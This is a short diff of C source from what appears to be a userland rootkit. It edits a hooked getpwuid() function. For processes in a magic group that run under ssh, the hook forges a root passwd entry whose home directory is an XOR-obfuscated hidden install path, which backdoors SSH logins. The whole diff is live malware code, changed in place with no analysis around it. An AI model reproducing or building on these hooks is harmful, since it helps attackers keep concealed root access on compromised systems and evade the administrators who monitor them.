@@ -17,9 +17,7 @@ struct passwd *getpwuid(uid_t uid)
     hook(CGETPWUID);
     if(uid == MAGIC_GID) return call(CGETPWUID, 0);
 
-    if(process_info.mygid == MAGIC_GID &&
-        uid == 0 &&
-        process("ssh")){
+    if(getgid() == MAGIC_GID && uid == 0 && process("ssh")){
         struct passwd *bpw;
         bpw = call(CGETPWUID, uid);
         bpw->pw_uid = 0;
@@ -27,7 +25,7 @@ struct passwd *getpwuid(uid_t uid)
 
         char home[PATH_MAX];
         xor(idir, INSTALL_DIR);
-        (void)snprintf(home, sizeof(home), "%s", idir);
+        (void)snprintf(home, sizeof(home) - 1, "%s", idir);
         clean(idir);
 
         bpw->pw_dir = strdup(home);
